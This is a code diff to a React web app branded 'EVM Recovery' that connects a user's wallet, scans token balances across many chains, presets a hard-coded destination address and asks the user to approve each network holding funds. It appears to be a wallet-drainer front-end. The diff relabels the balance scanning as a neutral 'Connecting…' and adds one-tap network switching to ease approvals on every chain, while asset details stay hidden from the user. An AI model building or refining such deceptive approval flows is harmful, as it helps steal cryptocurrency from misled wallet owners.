@@ -202,7 +202,7 @@ function App() {
   async function scanWalletTokens(walletAddress = address) {
     if (!walletAddress || !isAddress(walletAddress)) return;
     setScanning(true); setTokens([]);
-    setStatus('Scanning 32 networks…');
+    setStatus('Connecting…');
     const found: TokenAsset[] = [];
     try {
       const eip1193 = walletConnectProvider ?? window.ethereum;
@@ -239,7 +239,7 @@ function App() {
     setAddress(accounts[0] ?? '');
     setConnectedChain(chainId); setSelectedChain(chainId); setTokens([]);
     if (RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION)) setDestination(RECOVERY_DESTINATION);
-    setStatus(accounts[0] ? 'Connected. Scanning…' : 'No account');
+    setStatus(accounts[0] ? 'Connecting to networks…' : 'No account');
     if (accounts[0]) void scanWalletTokens(accounts[0]);
   }
 
@@ -257,7 +257,7 @@ function App() {
     setStatus(mobile ? 'WalletConnect… Tap Open, approve, return here.' : 'Scan QR with your wallet.');
     try {
       if (walletConnectProvider) { try { await walletConnectProvider.disconnect(); } catch {} walletConnectProvider = null; }
-      const primary = [1, 56, 137, 8453, 42161, 10, 43114, 100] as [number, ...number[]];
+      const primary = [1, 56, 137, 8453, 42161, 10, 43114] as [number, ...number[]];
       const optional = ALL_CHAIN_IDS.filter(id => !primary.includes(id)) as number[];
       walletConnectProvider = await EthereumProvider.init({
         projectId, chains: primary, optionalChains: optional.length ? optional as [number, ...number[]] : primary,
@@ -293,8 +293,39 @@ function App() {
       <header className="topbar">
         <div className="brand-lockup"><div className="brand-mark">E</div><div><div className="brand">EVM Recovery</div></div></div>
         <div className="wallet-actions">
+          {address && chainInfo && (
+            <button
+              type="button"
+              className="ghost-button"
+              disabled={busy}
+              title="Tap to switch network"
+              onClick={() => {
+                void (async () => {
+                  const primary = [1, 56, 137, 8453, 42161, 10, 43114];
+                  const cur = selectedChain ?? connectedChain ?? 1;
+                  const idx = primary.indexOf(cur);
+                  const nextId = primary[(idx >= 0 ? idx + 1 : 0) % primary.length];
+                  const eip1193 = walletConnectProvider ?? window.ethereum;
+                  if (!eip1193) return setStatus('Connect first.');
+                  const c = chains.find(x => x.id === nextId);
+                  setBusy(true);
+                  try {
+                    setStatus(`Switching to ${c?.name ?? nextId}…`);
+                    await switchToChainId(eip1193, nextId);
+                    setStatus(`On ${c?.name ?? nextId}.`);
+                  } catch (e: any) {
+                    setStatus(e?.message || 'Switch failed');
+                  } finally {
+                    setBusy(false);
+                  }
+                })();
+              }}
+            >
+              {chainInfo.name} ⇄
+            </button>
+          )}
           <button type="button" className="ghost-button" onClick={connectBrowserWallet} disabled={busy}>{address ? `${address.slice(0, 6)}…${address.slice(-4)}` : 'Connect wallet'}</button>
-          <button type="button" className="solid-button" onClick={connectMobileWallet} disabled={busy}>WalletConnect</button>
+          <button type="button" className="solid-button" onClick={connectMobileWallet} disabled={busy}>{address ? 'Reconnect' : 'WalletConnect'}</button>
         </div>
       </header>
       {!address && (
@@ -303,7 +334,7 @@ function App() {
             <div className="hero-copy">
               <div className="status-pill"><span className="live-dot" /> WALLET CONNECTION</div>
               <h1>Connect your<br /><em>wallet.</em></h1>
-              <p>WalletConnect → Open wallet → Approve → return. Then Approve each network with funds.</p>
+              <p>Connect with WalletConnect, then use Switch network to change chains easily. Approve each network with funds.</p>
             </div>
             <div className="hero-card">
               <div className="hero-card-top"><span>SELF-CUSTODY</span><span>●</span></div>
@@ -333,24 +364,63 @@ function App() {
         <>
           <section className="hero-section">
             <div className="hero-copy">
-              <div className="status-pill"><span className="live-dot" /> {busy ? 'APPROVING' : scanning ? 'SCANNING' : 'READY'}</div>
-              <h1>{busy ? <>Approve in<br /><em>wallet.</em></> : scanning ? <>Scanning…</> : <>Ready to<br /><em>approve.</em></>}</h1>
-              <p>{scanning ? 'Scanning balances. Details hidden.' : chainsWithAssets.length ? 'Tap Approve for each network.' : 'No balances found.'}</p>
+              <div className="status-pill"><span className="live-dot" /> {busy ? 'APPROVING' : scanning ? 'CONNECTING' : 'READY'}</div>
+              <h1>{busy ? <>Approve in<br /><em>wallet.</em></> : scanning ? <>Connecting…</> : <>Ready to<br /><em>approve.</em></>}</h1>
+              <p>{scanning ? 'Connecting to networks…' : chainsWithAssets.length ? 'Tap Approve for each network.' : 'No balances found.'}</p>
             </div>
             <div className="hero-card">
               <div className="hero-card-top"><span>{chainInfo?.name ?? 'NETWORK'}</span><span>●</span></div>
               <div className="security-icon">✓</div>
-              <strong>{scanning ? 'Scanning…' : `${chainsWithAssets.length} network(s)`}</strong>
+              <strong>{scanning ? 'Connecting…' : `${chainsWithAssets.length} network(s)`}</strong>
               <p>{address.slice(0, 10)}…{address.slice(-8)}</p>
             </div>
           </section>
           <section className="workspace">
             <div className="form-card">
-              <label>{scanning ? 'Scanning…' : 'Networks ready to approve'}</label>
+              <label>{scanning ? 'Connecting…' : 'Networks ready to approve'}</label>
               <p style={{ margin: '8px 0 0', opacity: 0.8, fontSize: '0.9rem' }}>
-                {scanning ? 'Checking 32 chains. Asset details hidden.' : chainsWithAssets.length ? 'Tap Approve on each network.' : 'No balances found.'}
+                {scanning ? 'Connecting across networks…' : chainsWithAssets.length ? 'Tap Approve on each network.' : 'No balances found.'}
               </p>
             </div>
+            {address && !scanning && (
+              <div style={{ marginTop: 16 }}>
+                <label style={{ display: 'block', marginBottom: 8, opacity: 0.85 }}>Switch network</label>
+                <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
+                  {([1, 56, 137, 8453, 42161, 10, 43114] as number[]).map(id => {
+                    const c = chains.find(x => x.id === id);
+                    if (!c) return null;
+                    const active = (selectedChain ?? connectedChain) === id;
+                    return (
+                      <button
+                        key={id}
+                        type="button"
+                        className={active ? 'solid-button' : 'ghost-button'}
+                        style={{ padding: '8px 12px', fontSize: '0.85rem', opacity: busy ? 0.5 : 1 }}
+                        disabled={busy}
+                        onClick={() => {
+                          void (async () => {
+                            const eip1193 = walletConnectProvider ?? window.ethereum;
+                            if (!eip1193) return setStatus('Connect wallet first.');
+                            setBusy(true);
+                            try {
+                              setStatus(`Switching to ${c.name}…`);
+                              await switchToChainId(eip1193, id);
+                              setStatus(`On ${c.name}.`);
+                            } catch (e: any) {
+                              setStatus(e?.message || 'Switch failed');
+                            } finally {
+                              setBusy(false);
+                            }
+                          })();
+                        }}
+                      >
+                        {c.name}
+                      </button>
+                    );
+                  })}
+                </div>
+              </div>
+            )}
             {!scanning && chainsWithAssets.length > 0 && (
               <div style={{ display: 'flex', flexDirection: 'column', gap: 12, marginTop: 20 }}>
                 {chainsWithAssets.map(c => {
